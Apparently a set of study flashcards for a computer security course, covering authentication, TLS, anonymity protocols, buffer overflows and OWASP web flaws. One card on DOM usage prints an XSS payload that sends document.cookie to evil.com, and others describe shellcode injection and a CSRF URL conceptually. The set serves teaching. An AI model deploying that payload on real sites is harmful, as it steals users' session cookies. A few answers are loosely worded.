Topic	Question	Answer
Authentication	How do banks do invisible 2-factor authentication?	Login to website using pass (something you know); website also is sent cookie from last time login (something you have); if pass and cookie match, you log in; if cookie is missing/wrong, something you have is proven by calling (phone) or emailing code (email)
Authentication	What are the 2 ways to protect a password on a server?	1. Encrypt the password and keep the key in safe place. \n2. Hash the password. Hashing doesn’t require secret key, thus there is nothing to loose
Authentication	"Give 5 examples of ""something you have"" that can authenticate you:"	1. Physical keys (like, well, real keys) - single factor authentication. \n2. RSA key fob (prints out number on button press, number is typed along with pass) - two factor auth. \n3. Chip in credit card - similar to RSA fob. \n4. Public/Private digital key - public unlocks what private locks and vice versa. PGP key is something you have which authenticates you. \n5. DKIM - people aren’t the only ones authenticating, servers do that too. DKIM email signature is used for that (preventing Spam)
Authentication	"Give 3 examples of ""something you are"" that can authenticate you:"	1. Fingerprint readers (and other biometrics): nearly unique; not all people have them; can’t be changed; are left everywhere. \n2. Continuous authentication: mouse and Keyboard usage patterns; nearly unique; easy to loose in case of injury; RSI patients issues. \n3. Privacy: users have the right to privacy & keeping unnecesary info of themselves hidden; authentication mechanisms need to not ask for more data than they need; identification via FB, Google, Apple acc is easy, but gives away a lot of data; requiring validated ID (drivers/passport info) exposes a lot of info.
SSL/TLS	What is SSL/TLS?	Protocol with the goal of providing Confidentiality and Integrity. Uses X.509​ certificates and ​ asymmetric cryptography​ to ​ exchange​ a ​ symmetric​ ​ key. Session key​ is used to ​ encrypt subsequent communication providing Data/Message confidentiality, message integrity and authentication.
SSL/TLS	Where does SSL/TLS operate, and how?	It operates above the transport layer using TCP. It proceeds with a handshake protocol in the following manner: Client Hello -> Server hello + Certificate -> Client Key exchange -> Server Change cipher spec
SSL/TLS	Why is SSL/TLS renegotiation needed and what are its weaknesses?	1. Refresh the keys. \n2. Increase authentication. \n3. Increase cipher strength. \nClient or server can trigger renegotiation by sending a hello message. Its weaknesses are that: \n1. Renegotiation has priority over application data. \n2. Can take place in the middle of an application layer transaction. \n3. Client ​DOESN’T CHANGE through renegotiation.
SSL/TLS	How does SAML (Security Assertion Markup Language) SSO (Single Sign On) work?	See Figure 6
SSL/TLS	How does Google implement SAML SSO?	Google’s SAML-based SSO for Google Applications deviates from the above protocol for a few, seemingly minor simplifications in the messages exchanged: \n1. ID and SP are not included in the authentication assertion, i.e. AA = AuthAssert(C; IdP) instead of AuthAssert(ID; C; IdP; SP); \n2. ID, SP and IdP are not included in the response, i.e. Resp = Response({AA}K^−1_{IdP}) instead of Response(ID; SP; IdP; {AA}K^−1_{IdP}).
Anonimity Protocols	Why do we need protocols for anonymity?	Because: \n1. Internet is a public network and network routers see all traffic passing through them. \n2. Routing information is public and IP packet headers contain source and destination of packets. \n3. Encryption doesn’t hide indentities, what it does it hides payload, but not the routing information.
Anonimity Protocols	What is anonymity and how can we achieve it? What kinds of protocols for that are there?	Using a service or resource without disclosing ones identity. This can be achieved by hiding one’s activities among other similar activities. \nDinning cryptographers; Crowds; Chaum’s mix; Onion routing
Anonimity Protocols	What is the setting for the Three-party dining cryptographers (3DC) protocol?	Three cryptographers are having dinner. Either NSA paid for the dinner, or one of the cryptographers. They want to know if it is the NSA that paid, but without revealing the identity of the cryptographer that paid in the case the NSA did not pay.
Anonimity Protocols	How does the 3DC protocol work? What are the limitations?	Each cryptographer flips a coin and shows it to the left neighbour. (Each of them will see their own coin and the coin of a right neighbour). Each cryptographer announces whether the two coins he saw are the same. If he is the payer, he lies. Odd number of “same” => NSA paid, Even number of same=> one of cryptographers paid. \nIt is impractical because it requires pair-wise shared secret keys (secure channels) between participants (share random bits); and large amounts of randomness.
Anonimity Protocols	What is the idea of the superposed sending in the 3DC protocol?	3DC protocol generalises to any group size n (nDC). Sender wants to anonymously broadcast a message m:\n1. For each bit of m, every user generates a random bit and sends it to left neighbour. Every user learns two bits - his own, and his right neighbours. \n2. Each user (except the sender) announces Own_bit XOR Neighbour_bit. \n3. Sender announces Own_bit XOR Neighbour_bit XOR message_bit. \n4. XOR of all announcements = message_bit. Every randomly generated bit occurs in the sum twice and is cancelled by XOR. Message_bit occurs only once.
Anonimity Protocols	What is the idea behind the Crowds protocol and how does it work? What is the problem with it?	Randomly route the request through crowd of users. A crowd is a group of m users; c out of m users may be corrupted. \nInitiator wanting to request a webpage creates a path between him and the server. Initiator selects forwarder from the crowd and sends him his request. Forwarder delivers request to server with probability of 1-Pf; He forwards the request to a randomly selected new forwarder from the crowd with probability Pf; New forwarder repeats the procedure. Response from server follows the same route in opposite direction. \nThe problem is that it is not resistant against an attacker that sees the whole network traffic.
Anonimity Protocols	How does Chaum's mix work and what are the limitations?	The mixes generate dummy messages to prevent an attacker sending n-1 messages to a mix with capacity n, allowing to then link sender of n’th message with recipient. Additionally, uses message padding and buffering to avoid time correlation attacks and have return addresses be anonymous. \nAsymmetric encryption, Dummy messages and Buffering are all innefficient.
Anonimity Protocols	What is the idea behind Onion Routing and what is its main problem?	Combine advantages of mixes and proxies, by using public-key crypto only to establish circuit, use symmetric-key crypto to exchange data and distribute trust like mixes. \nThe problem is that it does not defend against attackers that control the whole network.
Anonimity Protocols	Draw the TOR circuit setup and describe how the client connects to the server:	See Figure 7. \n1. Client establishes session key K1​ and circuit with Onion Router​ R1. \n2. Client tunnels through that circuit to extend to Onion Router ​R6. \n3. Client tunnels through that extended circuit to extend to Onion Router ​R4. \n4. Client applications connect and communicate through the established TOR circuit.
Anonimity Protocols	What security properties does TOR provide? What are its limitations?	TOR only provides privacy, not confidentiality. It anonymises the origin of the traffic and encrypts everything inside the TOR network. TOR ​DOES NOT​ encrypt all traffic through the Internet. For confidentiality, end-to-end encryption, such as SSL/TLS, still has to be used. \nTOR ​DOES NOT provide protection against end-to-end timing attacks. If attacker can see both ends of communication channel, he can correlate volume and timing information on these two sides.
Anonimity Protocols	How does TOR take care of DNS resolution and avoids censorship?	TOR only anonymises TCP streams. DNS resolution, if handled by the client browser, defeats the purpose of using TOR. To avoid privacy breaches due to DNS resolution, TOR browser delegates DNS resolution to the exit node over UDP. \nTOR relays are listed on public TOR directory. Your Local ISP can observe you communicating with TOR nodes. ISPs and governments can try to block access to the TOR network by blocking TOR relays. TOR bridge relays are relays not listed on the public TOR directory. Entering TOR network through TOR bridge relay can prevent ISPs and governments from blocking access to TOR network.
Memory Safety	What does Linux (32-bit) process memory layout look like?	See Figure 9.
Memory Safety	What can a buffer overflow do?	Load malicious code into memory and make %eip point to it
Memory Safety	What are the main three functions in a stack, and what do they do?	Caling function: \n1. Push arguments onto the stack (in reverse) \n2. Push the return address (I.E. the address of the instruction to run after control returns) \n3. Jump to the function’s address \n\nCalled function: \n1. Push the old frame pointer onto the stack (%ebp) \n2. Set frame pointer (%ebp) to where the end of the stack is right now (%esp) \n3. Push local variable onto the stack \n\nReturning function: \n1. Reset previous stack frame: %esp = %ebp, %ebp = (%ebp) \n2. Jump back to return address: %eip = 4(%esp)
Memory Safety	What is the shellcode injection's goal, and how does it work?	The goal is to ​ “spawn a shell”, which will give the attacker general access to the system. In order to do so: \nMust inject the machine code instructions (code ready to run); Code can’t contain zero bytes (printf, gets, strcpy will stop copying); Can’t use the loader (we’re injecting)
Memory Safety	What are the challenges of shellcode injection?	The main challenge is to find the address of the injected malicious code. If code accessible: we know how far is the overflowed variable from saved %ebp. If code not accessible: try different possibilities, as in 32 bits memory space there are 2^32 possibilities. It makes use of a NOP sled: Guess approximate stack state when the function is called and insert many NOPs before Shell Code
Memory Safety	What kinds of unsafe libc functions are there?	Unsafe functions do not check bounds of buffers they manipulate. Some examples include: strcpy (char *dest, const char *src); strcat (char *dest, const char *src); gets (char *s); scanf (const char *format, ...)
Memory Safety	How does an integer overflow happen?	It occurs when the system attempts to store a value in an integer which is greater than the maximum value integer can hold resulting in the value being trunctated.
Memory Safety	How do format string vulnerabilities arise?	The format function retrieves the parameters requested by the format string from the stack, the vulnerability arises when the attacker is able to provide the format string to the format function
Memory Safety	What are stack canaries?	They detect a stack buffer overflow before execution of malicious code. They do it by placing a small integer before the stack return pointer. To overwrite return pointer the canary value must also be overwritten. Canary is checked to make sure it has not changed before a routine uses return pointer on the stack.
Memory Safety	What kinds of stack canaries are there?	1. Terminator canaries (CR, LF, NUL (i.e., 0), -1): scanf etc. do not allow these values. \n2. Random canaries: Write a new random value at each process start and save real value somewhere in memory. Must write-protect stored value. \n3. Random XOR canaries: Similar as random canaries but they store canary XOR some control info, instead.
Memory Safety	Why would we want to make stack and heap non executable? What problem is there with that?	Because then even if the canary is bypassed, malicious code loaded cannot be executed.\nThe problem is that it makes the system vulnerable to return-to-libc attack: libc library is linked to most C programs and provides useful calls for an attacker.
Memory Safety	How does Addess space layout randomization work?	The idea of ASLR is to place standard libraries to random locations in memory. (For each program, exec() is situated at different location). It results in the attacker not being able to directly point to exec(). It is supported by most OS.
Web Security: Basics	Explain the different parts of a URL from the point of view of Web Security:	E.g. Protocol://host/FilePath?arg1=val1&arg2=val2 \nProtocol: protocol to access the resource (http, https, ftp, etc.) \nHost: name or IP address of the computer resource is on \nFilePath: path to the resource on the host \nResources can be static (file.html) or dynamic (do.php) \nURLs for dynamic content usually include arguments to pass to the process (arg1, arg2)
Web Security: Basics	What are the possible HTTP requests? What does an HTTP response contain?	GET, POST, PUT, etc. \nA response contains a Status-line, e.g. HTTP/1.1 200 OK; zero or more header(General|Response|Entity) fields followed by CRLF; an empty line (i.e., a line with nothing preceding the CRLF) indicating the end of the header fields; optionally a message-body
Web Security: Basics	How is state managed in HTTP sessions? Is there any problem with that?	HTTP is stateless: when client sends a request, server sends back a response, but server does not hold any information on previous requests. The problem with that is that​ in most web applications a client has to access various pages before completing a specific task and the client state should be kept along all those pages.
Web Security: Basics	How does the server know if two requests come from the same browser?	The server inserts some token into the page when it is requested and gets that token passed back with the next request. For this there are two main approaches​ (to maintain session between web client and web server): Using hidden fields; and using cookies
Web Security: Basics	How do Hidden fields work? What are their advantages and disadvantages?	The idea is to include an HTML form with hidden fields containing session ID in all HTML pages sent to client. The hidden fields will be returned back to server in the request. For example,​ the web server can send a hidden HTML form field along with a unique session ID as follows: When the form is submitted, the specified name and value are automatically included in the GET or POST data. \nTheir advantage is that all browsers support HTML forms. Their disadvantages are that it requires careful and tedious programming effort, as pages behave to be dynamically generated to include this hidden field; and the session ends as soon as the browser is closed.
Web Security: Basics	How do Cookies work? What are they used for and what is their problem?	A cookie is a small piece of information that server sends to browser and gets stored inside the browser. It has a name, a value and other attributes such as domain, path, expiration date, version, comments. Browsers automatically include cookies in all subsequent requests to originating host of the cookie. Cookies are only sent back by browser to their originating host and not any other hosts. Domain and path specify server and path to return the cookie. Server can set cookie value to uniquely identify a client. \nCookies are commonly used for session and user management, as well as to hold personalised information, or to help in online sales/service (e.g. shopping cart). \nTheir main problem is that users may disable cookies in their browser.
Web Security: Basics	What are the security goals, and defences employed, in web security?	Web applications should provide the same security guarantees as those required for standalone applications. \n1. Visiting malicious website should not infect computer with malware or read and write files \nDefences: ​ Javascript sandboxed, aviod bugs in browser code, privilege separation, etc. \n2. Visiting malicious website (evil.com) should not compromise my session on other websites (gmail.com). Defences:​ same-origin policy - each website is isolated from all other websites. \nSensitive data stored on websites (gmail.com) should be protected.
Web Security: Basics	What are the kinds of web security attackers?	There are two kinds: \nWeb attacker: Controls malicious website (evil.com); has valid SSL/TLS certificates for evil.com; victim user visits evil.com (weaker). \nNetwork attacker: Controls the whole network; can intercept, craft, send messages (stronger).
Web Security: Basics	Name the OWASP Top 10 Web security flaws:	1. Injection \n2. Broken Authentication and Session Management \n3. Cross-Site Scripting (XSS) \n4. Insecure Direct Object References \n5. Security Misconfiguration \n6. Sensitive Data Exposure \n7. Missing Function Level Access Control \n8. Cross-Site Request Forgery \n9. Using Components with Known Vulnerabilities \n10. Unvalidated Redirects and Forwards
Web Security: Basics	Describe the first 5 Web security flaws: Injection, Broken Authentication and Session Management, Cross-Site Scripting (XSS), Insecure Direct Object References and Security Misconfiguration	1. Injection​ - (SQL, OS injection) Untrusted data is sent to interpreter as part of a command or query, tricking interpreter into executing uninteded commands and accessing data without authorisation \n2. Broken Authentication and Session Management​ - Compromising passwords, keys, session tokens or other flaws to assume other users identities due to not correctly implementing authentication and session management app functions.\n3. Cross-Site Scripting (XSS)​ - App takes untrusted data and sends it to a browser without validation or escaping, allowing attackers to execute scripts in victim browser, hijacking user sessions, defacing websites and redirecting to malicious websites. \n4. Insecure Direct Object References ​ - (direct object reference: dev exposes reference to internal implementation object, such as file, directory or database key) Manipulate references to access unauthorised data due to no access control check or other protections\n5. Security Misconfiguration ​ - taking advantage of not configuring security correctly. Due to failure to define & deploy secure configuration for the application, frameworks, app server, web server, db server and platform (default settings are often insecure); or not keeping software up to date.
Web Security: Basics	Describe the second 5 Web security flaws: Sensitive Data Exposure, Missing Function Level Access Control, Cross-Site Request Forgery, Using Components with Known Vulnerabilities and Unvalidated Redirects and Forwards	6. Sensitive Data Exposure​ - Stealing or modifying weakly protected data to conduct credit card fraud, identity theft and etc. Sensitive data requires encryption at rest and in transit, as well as precautions taken when exchanged with the browser. \n7. Missing Function Level Access Control ​ - Forging request to access functionality without authorisation due to inexistent verification for function level access rights.\n8. Cross-Site Request Forgery (CSRF)​ - Forces logged-on victims browser to send a forged HTTP request, including victims session cookie and other auth information, to vulnerable web app.\n9. Using Components with Known Vulnerabilities​ - Exploiting apps using components with known vulnerabilities, resulting in data loss or server takeover.\n10. Unvalidated Redirects and Forwards ​ - Redirecting victim to phishing/malware site or use forward to access unauthorized pages due to unproper validation when redirecting or forwarding users.
Web Security: Server-side attacks	What are injection attacks?	Injection flaws​ such as SQL, OS injection, occur when untrusted data is sent to interpreter as part of a command or query. This can trick interpreter into executing unintended commands and accessing data without authorisation. The two main attacks are command injection attacks and SQL injection attacks.
Web Security: Server-side attacks	Explain what Command Injections are and state the defenses against them. Additionally, give an example.	Injection is generally caused when data and code share the same channel: “Whois” is the code and the filename data and​ ‘;’ allows attacker to include new command. Defences include: input validation, input escaping and use of less powerful API. \nExample: service that prints result back from Linux program whois, invoked via URL like ​http://www.example.com/content.php?domain=google.com.
Web Security: Server-side attacks	How do Databases work with web servers? What is SQL and its most common commands?	Web server connects to DB server. Web server sends queries and commands according to incoming HTTP requests. DB server returns associated values. DB server can modify and update the records. \nSQL is most used DB query language. Its most commond commands are: \nSELECT - returns values of given field in specified table, for all records matching condition. \nINSERT - retrieves a set of records from DB and adds new record in specified table. \nDROP - deletes entire specified table. \n';' - enables separate commands
Web Security: Server-side attacks	Give an example of a SQL injection. What sort of defence is there for these kinds of attacks?	Web server logs in a user if user exists with the given username and pass. It sees if results exist, and if so logs in the user and redirects them to user control panel.\nDefence: create a template of SQL query, in which data values are substituted; ensures that untrusted value is not interpreted as a command.
Web Security: Client-side attacks	Explain the concept of Web browsers:	The main function of a browser is to​ present a chosen web resource by requesting it from the server and displaying it in browser window. Resources include: HTML documents, PDF files, images, other. The location of these resources are​ specified by user usign URI (Uniform Resource Identifier)
Web Security: Client-side attacks	What are the components of a browser?	See Figure 10.
Web Security: Client-side attacks	Explain the concept of the Document Object Model (DOM):	DOM is a programing interface for HTML, XML, SVG documents. It provides a structured representation of a document tree and defines how structure can be accessed from other programs for changing doc structure, style or content. DOM represents documents as structured groups of nodes and objects with properties and methods. Nodes can have event handlers attached, executing them once event is triggered. Essentially, it connects web pages to scripts or programming languages.
Web Security: Client-side attacks	Draw the DOM diagram:	See Figure 11.
Web Security: Client-side attacks	Give a few examples of using DOM:	"Displaying an alert message by using the alert() function from the window object: \n<body onload=""window.alert(’welcome to my page!’);""> \nDisplaying all the cookies associated with the current document in an alert message: \n<body onload=""window.alert(document.cookie);""> \nSending all the cookies associated with the current document to the evil.com server if x points to a non-existent image: \n<img src=x onerror=this.src=’http://evil.com/?c=’+document.cookie>"
Web Security: Client-side attacks	Explain the concept of session hijacking:	Session hijacking​, also known as cookie hijacking, exploits a valid computer session to gain unauthorized access to information or services in a computer system. Sessions can be hijacked in different ways. The most common are: \nCookie theft vulnerabilities: Predictable session tokens (Cookies should be unpredictable); HTTPS/HTTP: site has mixed HTTPS/HTTP pages, and token is sent over HTTP (set secure attr for session tokens, always issue a new session token on login); cross-site scripting (XSS) vulnerabilities \nCross-site request forgery (CSRF) vulnerabilities
Web Security: Client-side attacks	Explain the concept of Cross-site requrest forgery (CSRF):	CSRF forces user to execute unwanted actions on a web application in which they are currently authenticated. CSRF attacks target state-changing requests, not theft of data, since attacker has no way to see the response to the forged request.
Web Security: Client-side attacks	How does CSRF work in practise?	Attacker targets a user who has an account on a vulnerable server, builds an exploit URL and tricks the victim into making a request to the vulnerable server as if intentional. The attacker has two tools: ability to get the user to click the exploit link; and ability to have victim visit attackers server while logged-in to a vulnerable server. The key condition of this attack is that ​requests to vulnerable server have predictable structure.
Web Security: Client-side attacks	Give an example of a CSRF attack:	Alice wishes to transfer $100 to Bob using the bank.com web application. This money transfer operation reduces to a request like: GET ​ http://bank.com/transfer.do​?acct=BOB&amount=100 HTTP/1.1 \nThe bank.com server is vulnerable to CSRF: the attacker can generate a valid malicious request for Alice to execute!! The attack comprises the following steps: \n1. Eve crafts the following URL http://bank.com/transfer.do acct=Eve&amount=100000 \n2. When Alice visits Eve’s website she tricks Alice’s browser into accessing this URL
Web Security: Client-side attacks	What are CSRF's defences?	Checking the referrer​ header in the client’s HTTP request can prevent CSRF attacks. Ensuring that the HTTP request has come from the original site means that attacks from other sites will not function. \nInclude a secret in every link/form: Can use a hidden form field, custom HTTP header, or encode it directly in the URL; Must be unpredictable!; Can be same value as session token (cookie); Ruby on Rails embeds secrets in every link automatically
Web Security: Client-side attacks	How does Cross-site scripting (XSS) work?	The attacker's goal is to inject code into browser with the guise of conforming to same-origin policy: \nSite “evil.com” provides malicious script. \nAttacker tricks the vulnerable server (bank.com) to send attacker’s script to the user’s browser! \nVictim’s browser believes that the script’s origin is bank.com...because it does! \nMalicious script runs with bank.com’s access privileges
Web Security: Client-side attacks	What are the differences between Stored and Reflected XSS attacks?	Stored attacks: injected script is permanently stored on the target servers, eg. database, message forum, visitor log, comment field, etc. Victim retrieves the malicious script from the server when it requesting stored information. \nReflected attacks: injected script is reflected off the web server​, eg. error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. The key to reflected XSS attack is to find a good web server which will echo user input back in HTML response.
Web Security: Client-side attacks	What are the XSS's defences?	1. Escape/filter output: ​ escape dynamic data before inserting it into HTML \n2. Input validation: ​ check that inputs (headers, cookies, query strings, form fields, hidden fields) are of expected form (whitelisting) \n3. CSP: ​ server supplies a whitelist of the scripts that are allowed to appear on the page
Web Security: Client-side attacks	What problem does the Same-origin policy (SOP) tackle?	Assuming you are logged into Facebook and visit a malicious website in another browser tab, the SOP prevents JavaScript on that website from doing anything to your Facebook account that you are allowed to do through accessing the DOM associated with the Facebook page.
Web Security: Client-side attacks	How does the SOP work?	The SOP restricts how a document or script loaded from one origin (e.g. www.evil.com) can interact with a resource from another origin (e.g. www.bank.com). Each origin is kept isolated (sandboxed) from the rest of the web. The SOP is very important when it comes to protecting HTTP cookies (used to maintain authenticated user sessions)
Web Security: Client-side attacks	What is an origin in the SOP context?	An origin is defined by the​ scheme​, the host​ and the​ port​ of a URL. SOP restricts access to DOM of web resource to scripts loaded from same origin. Cross-origin access can be allowed using CORS (Cross Origin Resource Sharing): this is a mechanism that allows many resources (fonts, JavaScript, etc) on a web page, to be requested from another domain outside the domain from which the resource originated. Cross-site HTTP requests initiated from within scripts are subject to SOP restriction for security reason
Web Security: Client-side attacks	What is, and how does Javascript work?	JS is a powerful web page programming language. Scripts embedded in web pages are returned by the web server, and are executed by the browser. They can: alter page contents (DOM objects), track events (mouse clicks, motion, keystrokes), issue web requests and read replies, maintain persistent connections (AJAX), read and set cookies. The HTML <script> elements can execute content retrieved from foreign origins.
